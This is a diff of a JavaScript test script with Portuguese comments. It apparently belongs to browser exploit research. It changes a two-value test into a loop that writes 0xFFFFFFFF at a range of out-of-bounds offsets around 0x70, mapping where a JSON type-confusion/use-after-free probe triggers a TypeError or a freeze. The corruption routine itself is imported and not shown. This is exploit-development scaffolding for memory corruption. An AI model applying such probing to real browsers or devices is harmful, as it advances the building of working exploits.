@@ -2,98 +2,96 @@
 import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
 import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
 import { executeFocusedTestForTypeError, current_toJSON_call_count_for_TypeError_test } from './testJsonTypeConfusionUAFSpeculative.mjs';
-import { OOB_CONFIG } from '../config.mjs'; // Importado para OOB_CONFIG.BASE_OFFSET_IN_DV
-import { toHex } from '../utils.mjs';     // Importado para logging de offsets
+import { OOB_CONFIG } from '../config.mjs';
+import { toHex } from '../utils.mjs';
 
-// --- Função toJSON Minimalista para Testar o Gatilho do TypeError ---
-// Esta versão foca no incremento do contador, que foi o primeiro gatilho do TypeError
-// no teste Decomp_V1_CounterOnly.
-function toJSON_MinimalTriggerForCrash() {
+// toJSON Minimalista para confirmar o ponto do TypeError
+function toJSON_MinimalTriggerForCrash_MapZone() {
     current_toJSON_call_count_for_TypeError_test++; // Operação suspeita de causar o TypeError
-    // document.title = `toJSON_MinimalTrigger Call ${current_toJSON_call_count_for_TypeError_test}`; // Mantenha comentado inicialmente
-    return { minimal_trigger_call: current_toJSON_call_count_for_TypeError_test };
+    // Apenas uma canária de título para ver se entramos aqui antes do TypeError
+    // Não usar logS3 aqui dentro para evitar que ele seja a causa.
+    document.title = `toJSON_MapZone Call ${current_toJSON_call_count_for_TypeError_test}`;
+    return { minimal_call_in_map_zone: current_toJSON_call_count_for_TypeError_test };
 }
 
+async function runMapDangerZoneAround0x70() {
+    const FNAME_RUNNER = "runMapDangerZoneAround0x70";
+    logS3(`==== INICIANDO Mapeamento da "Zona de Perigo" ao Redor de 0x70 ====`, 'test', FNAME_RUNNER);
 
-async function runDestructiveAndLessDestructiveTests() {
-    const FNAME_RUNNER = "runDestructiveAndLessDestructiveTests";
-    logS3(`==== INICIANDO Testes Destrutivo e Menos Destrutivo para TypeError ====`, 'test', FNAME_RUNNER);
+    const baseOffsetOOB = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128);
+    const originalCriticalOffset = baseOffsetOOB - 16; // 0x70
 
-    const criticalOffset = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
-
-    // Teste 1: Confirmar Comportamento Destrutivo com 0xFFFFFFFF
-    logS3(`\n--- Teste 1: Valor Destrutivo (0xFFFFFFFF) em ${toHex(criticalOffset)} ---`, 'subtest', FNAME_RUNNER);
-    let result1 = await executeFocusedTestForTypeError(
-        "DestructiveTest_0xFFFFFFFF_at_0x70",
-        toJSON_MinimalTriggerForCrash,
-        0xFFFFFFFF
-    );
-    if (result1.errorOccurred && result1.errorOccurred.name === 'TypeError') {
-        logS3(`   CONFIRMADO: ${result1.errorOccurred.name} ocorreu como esperado.`, "vuln", FNAME_RUNNER);
-    } else if (result1.errorOccurred) {
-        logS3(`   INESPERADO: Outro erro ocorreu: ${result1.errorOccurred.name} - ${result1.errorOccurred.message}`, "warn", FNAME_RUNNER);
-    } else if (result1.potentiallyCrashed) {
-        logS3(`   INESPERADO: Teste pode ter congelado.`, "error", FNAME_RUNNER);
-    } else {
-        logS3(`   INESPERADO: Teste completou sem o TypeError esperado. Chamadas toJSON: ${result1.calls}`, "warn", FNAME_RUNNER);
+    // Definir a faixa de offsets para testar ao redor de 0x70
+    // Ex: de 0x70 - 16 (0x60) até 0x70 + 16 (0x80), com passo de 2 ou 4.
+    const offsetsToTest = [];
+    for (let i = -16; i <= 16; i += 4) { // Testando de 0x60 a 0x80 com passo 4. Ajuste conforme necessário.
+        offsetsToTest.push(originalCriticalOffset + i);
     }
-    logS3(`   Título da página ao final de Teste 1: ${document.title}`, "info");
-    await PAUSE_S3(MEDIUM_PAUSE_S3);
-
-
-    // Teste 2: Tentar Valor Menos Destrutivo (0x00000000) em 0x70
-    logS3(`\n--- Teste 2: Valor Menos Destrutivo (0x00000000) em ${toHex(criticalOffset)} ---`, 'subtest', FNAME_RUNNER);
-    let result2 = await executeFocusedTestForTypeError(
-        "LessDestructiveTest_0x00000000_at_0x70",
-        toJSON_MinimalTriggerForCrash, // Usa a mesma toJSON minimalista
-        0x00000000
-    );
-
-    if (result2.errorOccurred && result2.errorOccurred.name === 'TypeError') {
-        logS3(`   INESPERADO: ${result2.errorOccurred.name} ocorreu com 0x00000000.`, "warn", FNAME_RUNNER);
-    } else if (result2.errorOccurred) {
-        logS3(`   INESPERADO: Outro erro ocorreu com 0x00000000: ${result2.errorOccurred.name} - ${result2.errorOccurred.message}`, "warn", FNAME_RUNNER);
-    } else if (result2.potentiallyCrashed) {
-        logS3(`   INESPERADO: Teste com 0x00000000 pode ter congelado.`, "error", FNAME_RUNNER);
-    } else {
-        logS3(`   RESULTADO ESPERADO (OU OK): Teste com 0x00000000 completou sem TypeError. Chamadas toJSON: ${result2.calls}`, result2.calls > 0 ? "good" : "info", FNAME_RUNNER);
+    // Adicionar o offset 0x70 original para garantir que está incluído
+    if (!offsetsToTest.includes(originalCriticalOffset)) {
+        offsetsToTest.push(originalCriticalOffset);
+        offsetsToTest.sort((a, b) => a - b); // Manter ordenado
     }
-    logS3(`   Título da página ao final de Teste 2: ${document.title}`, "info");
-    await PAUSE_S3(MEDIUM_PAUSE_S3);
+    
+    logS3(`   Offsets a serem testados: ${offsetsToTest.map(o => toHex(o)).join(', ')}`, 'info', FNAME_RUNNER);
 
-    logS3(`==== Testes Destrutivo e Menos Destrutivo CONCLUÍDOS ====`, 'test', FNAME_RUNNER);
+    const valueForCorruption = 0xFFFFFFFF; // Valor que sabemos ser problemático em 0x70
 
-    // Instrução para o próximo passo baseado nos resultados
-    if (result1.errorOccurred?.name === 'TypeError' && !result2.errorOccurred && !result2.potentiallyCrashed && result2.calls > 0) {
-        logS3(`\nPRÓXIMO PASSO RECOMENDADO: O valor 0x00000000 parece ser "menos destrutivo".`, "good", FNAME_RUNNER);
-        logS3(`   Considere usar 0x00000000 com a 'detailed_toJSON_for_UAF_TC_test_WithDepthControl_AndSlice' para sondagem.`, "info", FNAME_RUNNER);
-    } else if (result1.errorOccurred?.name === 'TypeError' && result2.errorOccurred?.name === 'TypeError') {
-        logS3(`\nAVISO: Ambos os valores (0xFFFFFFFF e 0x00000000) causaram TypeError. A corrupção em 0x70 é muito sensível.`, "warn", FNAME_RUNNER);
-    } else {
-        logS3(`\nREVISAR RESULTADOS: O comportamento foi inesperado. Verifique os logs detalhadamente.`, "info", FNAME_RUNNER);
+    for (const currentOffset of offsetsToTest) {
+        if (currentOffset < 0) { // Evitar offsets negativos se não fizerem sentido para o buffer
+            logS3(`\n--- Pulando offset negativo: ${toHex(currentOffset)} ---`, 'warn', FNAME_RUNNER);
+            continue;
+        }
+
+        const testDescription = `MapZone_Offset_${toHex(currentOffset)}_Val_FFFF`;
+        logS3(`\n--- Testando Offset: ${toHex(currentOffset)} com valor ${toHex(valueForCorruption)} ---`, 'subtest', FNAME_RUNNER);
+        
+        let result = await executeFocusedTestForTypeError(
+            testDescription,
+            toJSON_MinimalTriggerForCrash_MapZone,
+            valueForCorruption,
+            currentOffset // Passando o offset atual para o teste
+        );
+
+        if (result.errorOccurred && result.errorOccurred.name === 'TypeError') {
+            logS3(`   RESULTADO para Offset ${toHex(currentOffset)}: ${result.errorOccurred.name} ocorreu como esperado. Chamadas toJSON: ${result.calls}`, "vuln", FNAME_RUNNER);
+        } else if (result.errorOccurred) {
+            logS3(`   RESULTADO para Offset ${toHex(currentOffset)}: Outro erro: ${result.errorOccurred.name} - ${result.errorOccurred.message}. Chamadas toJSON: ${result.calls}`, "warn", FNAME_RUNNER);
+        } else if (result.potentiallyCrashed) {
+            logS3(`   RESULTADO para Offset ${toHex(currentOffset)}: CONGELAMENTO POTENCIAL. Chamadas toJSON: ${result.calls}`, "error", FNAME_RUNNER);
+        } else {
+            logS3(`   RESULTADO para Offset ${toHex(currentOffset)}: Completou SEM TypeError. Chamadas toJSON: ${result.calls}`, "good", FNAME_RUNNER);
+        }
+        logS3(`   Título da página ao final do teste para Offset ${toHex(currentOffset)}: ${document.title}`, "info");
+        await PAUSE_S3(MEDIUM_PAUSE_S3);
+
+        if (document.title.startsWith("CONGELOU?")) {
+            logS3(`Congelamento detectado no offset ${toHex(currentOffset)}, interrompendo mapeamento.`, "error", FNAME_RUNNER);
+            break; 
+        }
     }
+    logS3(`==== Mapeamento da "Zona de Perigo" CONCLUÍDO ====`, 'test', FNAME_RUNNER);
 }
 
 export async function runAllAdvancedTestsS3() {
-    const FNAME = 'runAllAdvancedTestsS3_DestructiveThenLessDestructive';
+    const FNAME = 'runAllAdvancedTestsS3_MapDangerZone';
     const runBtn = getRunBtnAdvancedS3();
     const outputDiv = getOutputAdvancedS3();
 
     if (runBtn) runBtn.disabled = true;
     if (outputDiv) outputDiv.innerHTML = '';
 
-    logS3(`==== INICIANDO Script 3: Testes Destrutivo e Menos Destrutivo para TypeError ====`,'test', FNAME);
-    document.title = "Iniciando Script 3 - Teste Destrutivo/Menos Destrutivo";
+    logS3(`==== INICIANDO Script 3: Mapeamento da "Zona de Perigo" ao Redor de 0x70 ====`,'test', FNAME);
+    document.title = "Iniciando Script 3 - Mapeamento Zona Perigo";
     
-    await runDestructiveAndLessDestructiveTests();
+    await runMapDangerZoneAround0x70();
     
-    logS3(`\n==== Script 3 CONCLUÍDO (Testes Destrutivo e Menos Destrutivo para TypeError) ====`,'test', FNAME);
+    logS3(`\n==== Script 3 CONCLUÍDO (Mapeamento da "Zona de Perigo") ====`,'test', FNAME);
     if (runBtn) runBtn.disabled = false;
     
-    // Ajuste final do título
     if (document.title.startsWith("Iniciando") || document.title.includes("ERRO") || document.title.includes("CONGELOU?")) {
-        // Manter título
+        // Manter
     } else {
-        document.title = "Script 3 Concluído - D/LD Test";
+        document.title = "Script 3 Concluído - Mapeamento Zona Perigo";
     }
 }
